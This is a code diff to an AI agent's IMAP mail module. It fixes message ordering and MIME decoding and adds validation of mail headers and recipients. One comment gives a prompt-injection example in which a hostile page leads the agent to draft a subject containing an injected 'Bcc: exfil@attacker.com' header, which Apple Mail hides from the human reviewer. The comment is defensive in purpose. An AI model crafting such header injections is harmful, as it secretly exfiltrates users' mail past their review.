@@ -32,7 +32,13 @@ export interface MailSummary {
   seen: boolean;
 }
 
-export type MailFailure = 'auth' | 'network' | 'timeout' | 'not-configured' | 'no-such-message';
+export type MailFailure =
+  | 'auth'
+  | 'network'
+  | 'timeout'
+  | 'not-configured'
+  | 'no-such-message'
+  | 'invalid-recipient';
 
 export type MailResult<T> =
   | { ok: true; value: T }
@@ -177,8 +183,18 @@ export async function searchMail(
       const uids = await client.search(criteria, { uid: true });
       if (!uids || uids.length === 0) return [];
 
-      // Newest first, then capped — the tail of a long thread is what matters.
-      const wanted = uids.slice(-limit).reverse();
+      /*
+       * Cap to the newest `limit` UIDs. The ORDER is fixed after fetching, not
+       * here: IMAP returns messages in ascending sequence order whatever order
+       * the UID set is written in, so the `.reverse()` that used to be on this
+       * line was discarded by the server and "newest first" came back oldest
+       * first. The model then reported the wrong message as the latest.
+       *
+       * It passed its test because the fake's `fetch()` ignored its `range`
+       * argument and yielded a hand-ordered list — a mock agreeing with the
+       * code rather than with the protocol.
+       */
+      const wanted = uids.slice(-limit);
 
       const out: MailSummary[] = [];
       for await (const msg of client.fetch(wanted, { uid: true, envelope: true, flags: true, bodyStructure: false }, { uid: true })) {
@@ -194,7 +210,9 @@ export async function searchMail(
           seen: flagList.includes('\\Seen'),
         });
       }
-      return out;
+      // Newest first, decided here because the server chose the arrival order.
+      // UIDs are strictly increasing within a mailbox, so this IS recency.
+      return out.sort((a, b) => b.uid - a.uid);
     },
     factory,
   );
@@ -234,24 +252,173 @@ export async function readMail(
 /**
  * The readable part of an RFC822 message.
  *
- * Deliberately simple: headers are dropped at the first blank line, and if the
- * message is multipart the first text/plain part wins. A full MIME walk is a
- * library's job, and the failure mode here is "shows a bit of HTML", not
- * "corrupts the mailbox".
+ * The previous version took the FIRST `boundary=` anywhere in the raw message
+ * and did no transfer-encoding decoding. Both assumptions fail on ordinary
+ * Apple Mail:
+ *
+ *   - A normal message is `multipart/mixed` wrapping `multipart/alternative`
+ *     wrapping `text/plain` + `text/html`. Splitting on the OUTER boundary
+ *     yields one segment containing the whole alternative part, which matches
+ *     `/content-type:\s*text\/plain/` because that string appears inside its
+ *     BODY — so `MailRead` returned `--innerBoundary\r\nContent-Type:…` plus
+ *     the entire HTML alternative.
+ *   - `Content-Transfer-Encoding: quoted-printable` came back as
+ *     `Thanks for=E2=80=A6`, and base64 as a wall of base64 filling the whole
+ *     20k character budget.
+ *
+ * Still not a full MIME library — no charset conversion beyond utf-8, no
+ * message/rfc822 recursion — but it walks the tree it is actually given and
+ * decodes the two encodings that account for essentially all real mail. Depth
+ * is bounded because a malformed message must not be able to spin this.
  */
-export function extractPlainText(raw: string): string {
-  const boundary = /boundary="?([^";\r\n]+)"?/i.exec(raw)?.[1];
-  if (boundary) {
-    const parts = raw.split(`--${boundary}`);
-    const plain = parts.find((p) => /content-type:\s*text\/plain/i.test(p));
-    if (plain) return stripHeaders(plain).trim();
+/*
+ * A bound, not a fix. Every real message terminates on its own because each
+ * split consumes input, so no test can catch its removal — said plainly rather
+ * than left looking load-bearing. It is here because this parses attacker-
+ * adjacent text and a cheap ceiling on recursion costs nothing.
+ */
+const MAX_MIME_DEPTH = 8;
+
+/** Everything up to the first blank line: this section's own headers. */
+function headerBlock(section: string): string {
+  const idx = section.search(/\r?\n\r?\n/);
+  return idx === -1 ? section : section.slice(0, idx);
+}
+
+/** One header's value, with folded continuation lines joined. */
+function headerOf(headers: string, name: string): string | null {
+  const re = new RegExp(`^${name}:([^\r\n]*(?:\r?\n[ \t][^\r\n]*)*)`, 'im');
+  return re.exec(headers)?.[1].replace(/\r?\n[ \t]+/g, ' ').trim() ?? null;
+}
+
+function decodeQuotedPrintable(body: string): string {
+  // Soft line breaks first — `=` at end of line means "this line continues".
+  const joined = body.replace(/=\r?\n/g, '');
+  const bytes: number[] = [];
+  for (let i = 0; i < joined.length; i++) {
+    const hex = joined.slice(i + 1, i + 3);
+    if (joined[i] === '=' && /^[0-9a-f]{2}$/i.test(hex)) {
+      bytes.push(parseInt(hex, 16));
+      i += 2;
+    } else {
+      bytes.push(joined.charCodeAt(i) & 0xff);
+    }
   }
-  return stripHeaders(raw).trim();
+  return Buffer.from(bytes).toString('utf8');
+}
+
+/** A leaf part's body, decoded according to its own transfer encoding. */
+function decodePart(section: string): string {
+  const enc = (headerOf(headerBlock(section), 'content-transfer-encoding') ?? '').toLowerCase();
+  const body = stripHeaders(section);
+  try {
+    if (enc === 'base64') return Buffer.from(body.replace(/\s+/g, ''), 'base64').toString('utf8');
+    if (enc === 'quoted-printable') return decodeQuotedPrintable(body);
+  } catch {
+    // A part that will not decode is shown as it arrived rather than dropped —
+    // unreadable text is still a signal; a blank body looks like an empty email.
+  }
+  return body;
+}
+
+interface MimePart {
+  type: string;
+  text: string;
+}
+
+function collectParts(section: string, depth: number, out: MimePart[]): void {
+  const headers = headerBlock(section);
+  const contentType = (headerOf(headers, 'content-type') ?? 'text/plain').trim();
+
+  if (/^multipart\//i.test(contentType) && depth < MAX_MIME_DEPTH) {
+    // Taken from this section's own Content-Type. In practice the first
+    // `boundary=` in the section is the same string, so reading it from the
+    // header is precision rather than a fix — the fix is that we RECURSE at
+    // all. The old code split once on the outermost boundary and then looked
+    // for a segment whose text matched /text\/plain/, which the whole
+    // alternative part did, because that string appears inside its body.
+    const boundary = /boundary="?([^";\r\n]+)"?/i.exec(contentType)?.[1];
+    if (boundary) {
+      const segments = stripHeaders(section).split(`--${boundary}`);
+      // segments[0] is the preamble; a segment starting `--` is the terminator.
+      for (const segment of segments.slice(1)) {
+        if (segment.startsWith('--')) break;
+        collectParts(segment.replace(/^\r?\n/, ''), depth + 1, out);
+      }
+      return;
+    }
+  }
+  out.push({ type: contentType.toLowerCase(), text: decodePart(section) });
+}
+
+export function extractPlainText(raw: string): string {
+  const parts: MimePart[] = [];
+  collectParts(raw, 0, parts);
+
+  const plain = parts.find((p) => p.type.startsWith('text/plain'));
+  if (plain) return plain.text.trim();
+
+  // No plain alternative — better a de-tagged HTML body than raw markup.
+  const html = parts.find((p) => p.type.startsWith('text/html'));
+  if (html) {
+    return html.text
+      .replace(/<(script|style)[\s\S]*?<\/\1>/gi, '')
+      .replace(/<[^>]+>/g, ' ')
+      .replace(/&nbsp;/g, ' ')
+      .replace(/&amp;/g, '&')
+      .replace(/&lt;/g, '<')
+      .replace(/&gt;/g, '>')
+      .replace(/[ \t]+/g, ' ')
+      .replace(/\n{3,}/g, '\n\n')
+      .trim();
+  }
+  return (parts[0]?.text ?? stripHeaders(raw)).trim();
 }
 
 function stripHeaders(section: string): string {
   const idx = section.search(/\r?\n\r?\n/);
   return idx === -1 ? section : section.slice(idx).replace(/^\r?\n\r?\n/, '');
+}
+
+/**
+ * RFC 5322 headers are LINE-ORIENTED, so a newline in a value is a new header.
+ *
+ * `draftMail` interpolated the model's `to`, `cc` and `subject` straight into
+ * the header block. The tool schema is `z.string()`, which permits newlines, so
+ * a prompt-injected page could get the agent to call
+ *
+ *     MailDraft({ subject: "Invoice\r\nBcc: exfil@attacker.com", … })
+ *
+ * and the appended draft carries a real `Bcc` header. Apple Mail's compose view
+ * does not show Bcc by default, so the human "review before sending" step —
+ * the entire reason this module drafts instead of sending, and the reason it
+ * ships no SMTP client at all — reviews a message whose real recipient list it
+ * is not displaying.
+ *
+ * The `[ \t]*` also eats the leading whitespace of a folded continuation line.
+ * That part is TIDINESS, not safety, and is marked as such because sabotaging
+ * it breaks no test: once the newline is gone the value is a single line
+ * whatever follows it. Removing the newline is the whole security property.
+ */
+function headerValue(raw: string): string {
+  return raw.replace(/[\r\n]+[ \t]*/g, ' ').trim();
+}
+
+/**
+ * A comma-separated recipient list, or null if any entry is not an address.
+ *
+ * Recipients are REFUSED rather than sanitised. A mangled subject line is a
+ * cosmetic problem; a mangled address list is a message going somewhere the
+ * user did not intend, and quietly "cleaning" it would hide exactly the case
+ * worth surfacing.
+ */
+const ADDRESS = /^[^\s@<>,;:"\\]+@[^\s@<>,;:"\\]+\.[^\s@<>,;:"\\]+$/;
+function addressList(raw: string): string | null {
+  const parts = raw.split(',').map((p) => headerValue(p)).filter(Boolean);
+  if (parts.length === 0) return null;
+  // A display name is stripped rather than supported: `Name <a@b.c>` gives the
+  // model a second place to hide a newline for no capability gain.
+  return parts.every((p) => ADDRESS.test(p)) ? parts.join(', ') : null;
 }
 
 /**
@@ -268,6 +435,23 @@ export async function draftMail(
   msg: { to: string; subject: string; body: string; cc?: string },
   factory: ImapFactory = defaultFactory,
 ): Promise<MailResult<{ mailbox: string }>> {
+  const to = addressList(msg.to);
+  if (!to) {
+    return {
+      ok: false,
+      kind: 'invalid-recipient',
+      message: `Not a valid email address: ${headerValue(msg.to).slice(0, 120)}`,
+    };
+  }
+  const cc = msg.cc ? addressList(msg.cc) : null;
+  if (msg.cc && !cc) {
+    return {
+      ok: false,
+      kind: 'invalid-recipient',
+      message: `Not a valid Cc address: ${headerValue(msg.cc).slice(0, 120)}`,
+    };
+  }
+
   return withMailbox(
     creds,
     'INBOX',
@@ -279,10 +463,10 @@ export async function draftMail(
         'Drafts';
 
       const headers = [
-        `From: ${creds!.appleId}`,
-        `To: ${msg.to}`,
-        ...(msg.cc ? [`Cc: ${msg.cc}`] : []),
-        `Subject: ${msg.subject}`,
+        `From: ${headerValue(creds!.appleId)}`,
+        `To: ${to}`,
+        ...(cc ? [`Cc: ${cc}`] : []),
+        `Subject: ${headerValue(msg.subject)}`,
         `Date: ${new Date().toUTCString()}`,
         'MIME-Version: 1.0',
         'Content-Type: text/plain; charset=utf-8',
